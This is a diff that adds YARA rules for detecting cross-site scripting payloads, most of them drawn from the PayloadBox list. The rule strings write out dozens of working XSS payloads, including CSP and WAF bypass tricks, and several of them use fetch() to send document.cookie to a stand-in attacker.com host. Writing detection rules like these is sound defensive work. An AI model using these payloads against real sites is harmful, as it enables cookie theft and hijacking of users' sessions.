@@ -158,3 +158,220 @@ rule detect_xss_payloads_bypass_with_condition_and_bypass_HTML5 {
     condition:
         any of ($xss_payload*) or any of ($bypass_payload*)
 }
+rule XSS_Payload_1 {
+    meta:
+        description = "Detects <img> tag with onerror attribute containing alert payload"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload1 = /<img[^>]*src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload2 = /<image[^>]*src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+    condition:
+        $payload1 or $payload2
+}
+
+rule XSS_Payload_2 {
+    meta:
+        description = "Detects <audio> tag with onerror attribute containing alert payload"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload = /<audio[^>]*src=[^>]*href=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+    condition:
+        $payload
+}
+
+rule XSS_Payload_3 {
+    meta:
+        description = "Detects <video> tag with onerror attribute containing alert payload"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload = /<video[^>]*src=[^>]*href=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+    condition:
+        $payload
+}
+
+rule XSS_Payload_4 {
+    meta:
+        description = "Detects <body> tag with onerror attribute containing alert payload"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload = /<body[^>]*src=[^>]*href=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+    condition:
+        $payload
+}
+
+rule XSS_Payload_5 {
+    meta:
+        description = "Detects <a> tag with href attribute containing javascript:alert payload"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload = /<a[^>]*href=["']javascript\\x3Aalert\(1\)["'][^>]*>/
+    condition:
+        $payload
+}
+
+rule XSS_Payload_6 {
+    meta:
+        description = "Detects <p><svg><script> sequence with alert payload"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload = /<\/p><svg><script>[^<]*alert\(1\)/
+    condition:
+        $payload
+}
+
+rule XSS_Payload_7 {
+    meta:
+        description = "Detects <a> tag with various hexadecimal representations of javascript:alert payload"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload1 = /<a[^>]*href=["']javas\\x00cript:alert\(1\)["'][^>]*>/
+        $payload2 = /<a[^>]*href=["']javas\\x07cript:alert\(1\)["'][^>]*>/
+        $payload3 = /<a[^>]*href=["']javas\\x0Dcript:alert\(1\)["'][^>]*>/
+        $payload4 = /<a[^>]*href=["']javas\\x0Acript:alert\(1\)["'][^>]*>/
+        $payload5 = /<a[^>]*href=["']javas\\x08cript:alert\(1\)["'][^>]*>/
+        $payload6 = /<a[^>]*href=["']javas\\x02cript:alert\(1\)["'][^>]*>/
+        $payload7 = /<a[^>]*href=["']javas\\x03cript:alert\(1\)["'][^>]*>/
+        $payload8 = /<a[^>]*href=["']javas\\x04cript:alert\(1\)["'][^>]*>/
+        $payload9 = /<a[^>]*href=["']javas\\x01cript:alert\(1\)["'][^>]*>/
+        $payload10 = /<a[^>]*href=["']javas\\x05cript:alert\(1\)["'][^>]*>/
+        $payload11 = /<a[^>]*href=["']javas\\x0Bcript:alert\(1\)["'][^>]*>/
+        $payload12 = /<a[^>]*href=["']javas\\x09cript:alert\(1\)["'][^>]*>/
+        $payload13 = /<a[^>]*href=["']javas\\x06cript:alert\(1\)["'][^>]*>/
+        $payload14 = /<a[^>]*href=["']javas\\x0Ccript:alert\(1\)["'][^>]*>/
+    condition:
+        any of ($payload*)
+}
+
+rule XSS_Payload_8 {
+    meta:
+        description = "Detects <img> tag with various hexadecimal representations of onerror alert payload"
+        reference = "PayloadBox XSS"
+    strings:
+        $payload1 = /<img[^>]*\\x00src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload2 = /<img[^>]*\\x47src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload3 = /<img[^>]*\\x11src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload4 = /<img[^>]*\\x12src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload5 = /<img[^>]*\\x13src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload6 = /<img[^>]*\\x32src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload7 = /<img[^>]*\\x10src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload8 = /<img[^>]*\\x34src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload9 = /<img[^>]*\\x39src=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload10 = /<img[^>]*src\\x09=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload11 = /<img[^>]*src\\x10=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload12 = /<img[^>]*src\\x11=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload13 = /<img[^>]*src\\x12=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+        $payload14 = /<img[^>]*src\\x13=[^>]*onerror=[^>]*alert\(1\)[^>]*>/
+    condition:
+        any of ($payload*)
+}
+rule XSS_CSP_WAF_Bypass {
+    meta:
+        description = "Detects XSS attack payloads designed to bypass CSP and WAF protections"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "None"
+        
+    strings:
+        $payload1 = "<img src=x onerror=\"window \">"
+        $payload2 = "<svg><script> </script></svg>"
+        $payload3 = "<iframe srcdoc=\"<script>ale`rt(1)</script>\"></iframe>"
+        $payload4 = "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"
+        $payload5 = "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>"
+        $payload6 = "<img src=x onerror=\"fetch('http://attacker.com?c='+document.cookie)\">"
+        $payload7 = "<meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\"><script src='data:text/javascript,alert(1)'></script>"
+        $payload8 = "<svg/onload=import('data:text/javascript,alert(1))>"
+        $payload9 = "<img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>"
+        $payload10 = "<link rel='preload' href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' as='script' onload='this.rel=\"stylesheet\"'>"
+        $payload11 = "<style>@import url('data:text/css,@import%20%22javascript:alert(1)%22;');</style>"
+        $payload12 = "<img src='x' onerror='fetch(\"https://attacker.com?\"+document.cookie)'>"
+        $payload13 = "<input type='text' value='<img src=x onerror=alert(1)>'>"
+        $payload14 = "<body onload='fetch(\"https://attacker.com?\"+document.cookie)'>"
+        $payload15 = "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>"
+        $payload16 = "<svg/onload='this.outerHTML=`<script>alert(1)</script>`'>"
+        $payload17 = "<img src='javascript:alert(1)'>"
+        $payload18 = "<form action='javascript:alert(1)'><input type='submit'></form>"
+        $payload19 = "<iframe src=\"data:text/html,<script>alert('XSS')\"></iframe>"
+        $payload20 = "<script src='data:text/javascript,alert(1)'></script>"
+        $payload21 = "<video><source onerror='javascript:alert(1)'></video>"
+        $payload22 = "<img src=x onerror=this.onerror=window.onerror=alert(1)>"
+        $payload23 = "<img src=x onerror=alert`1`>"
+        $payload24 = "<img src=x onerror=alert(/1/)>"
+        $payload25 = "<input autofocus onfocus=alert(1)>"
+        $payload26 = "<input onblur=alert(1) autofocus>"
+        $payload27 = "<script>location='java'+'script:alert(1)'</script>"
+        $payload28 = "<meta content=\"0;url=javascript:alert(1);\" http-equiv=refresh>"
+        $payload29 = "<a href=javascript:alert(1)>Click</a>"
+        $payload30 = "<audio src onerror=alert(1)>"
+        $payload31 = "<video src onerror=alert(1)>"
+        $payload32 = "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">"
+        $payload33 = "<object data='data:text/html,<script>alert(1)</script>'></object>"
+        $payload34 = "<embed src='data:text/html,<script>alert(1)</script>'></embed>"
+        $payload35 = "<img src=x onerror=alert`1`>"
+        $payload36 = "<img src=x onerror=alert&lpar;1&rpar;>"
+        $payload37 = "<img src=x onerror=alert&lpar;1&rpar;/>"
+        $payload38 = "<img src=x onerror='alert&lpar;1&rpar;'>"
+        $payload39 = "<iframe src=\"data:text/html;charset=utf-7,<script>alert(1)</script>\"></iframe>"
+        $payload40 = "<svg><script>eval(\"al\"+\"ert(1)\")</script></svg>"
+        $payload41 = "<form><button formaction='javascript:alert(1)'>X</button></form>"
+        $payload42 = "<iframe src=\"data:text/html,<svg xmlns=%22http://www.w3.org/2000/svg%22 onload=%22javascript:alert(1)%22>\"></iframe>"
+        $payload43 = "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"javascript:alert(1)\">"
+        $payload44 = "<marquee width=1 loop=1 onfinish=javascript:alert(1)>"
+        $payload45 = "<math><mtext></mtext><script>alert(1)</script></math>"
+
+    condition:
+        any of ($payload*)
+}
+rule XSS_Attacks
+{
+    meta:
+        description = "Detects XSS attack payloads from payloadbox XSS payload list"
+        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
+        reference = "None"
+        
+    strings:
+        // Previous payloads
+        $payload1 = "<svg/onload=alert(1)>"
+        $payload2 = "<body/onload=alert(1)>"
+        $payload3 = "<iframe src=javascript:alert(1)>"
+        $payload4 = "<input type=image src=javascript:alert(1)>"
+        $payload5 = "<form><button formaction=javascript:alert(1)>Click me</button></form>"
+        $payload6 = "<a href=javascript:alert(1)>Click me</a>"
+        $payload7 = "<img src=x onerror=alert(1)>"
+        $payload8 = "<link rel=stylesheet href=javascript:alert(1)>"
+        $payload9 = "<meta http-equiv=refresh content=0;url=javascript:alert(1)>"
+        $payload10 = "<object data=javascript:alert(1)>"
+        $payload11 = "<script>alert(1)</script>"
+        $payload12 = "<embed src=javascript:alert(1)>"
+        $payload13 = "<details open ontoggle=alert(1)>"
+        $payload14 = "<marquee onstart=alert(1)>"
+        $payload15 = "<math><mtext></mtext><a xlink:href=javascript:alert(1)>Click me</a></math>"
+        $payload16 = "<isindex action=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>"
+        $payload17 = "<svg/onload=prompt(1)>"
+        $payload18 = "<img src='javascript:alert(1)'>"
+        $payload19 = "<script src='http://example.com/xss.js'></script>"
+        $payload20 = "<img src='http://example.com/xss.svg' onload='alert(1)'>"
+        $payload21 = "<bgsound src='javascript:alert(1)'>"
+        $payload22 = "<style>@import 'javascript:alert(1)';</style>"
+        $payload23 = "<frame src='javascript:alert(1)'>"
+        $payload24 = "<layer src='http://example.com/xss.js'></layer>"
+        $payload25 = "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
+        $payload26 = "<object data='javascript:alert(1)'>"
+        $payload27 = "<applet code='javascript:alert(1)'></applet>"
+        $payload28 = "<base href='javascript:alert(1)//'>"
+        $payload29 = "<bgsound src='javascript:alert(1)'>"
+        $payload30 = "<blink>Click <a href='javascript:alert(1)'>here</a></blink>"
+        $payload31 = "<comment><img src='x' onerror='alert(1)'></comment>"
+        $payload32 = "<iframe src='javascript:alert(1)'></iframe>"
+        $payload33 = "<img src='javascript:alert(1)'/>"
+        $payload34 = "<link href='javascript:alert(1)'>"
+        $payload35 = "<style>.x{background-image:url(javascript:alert(1))}</style>"
+
+    condition:
+        any of ($payload*)
+}
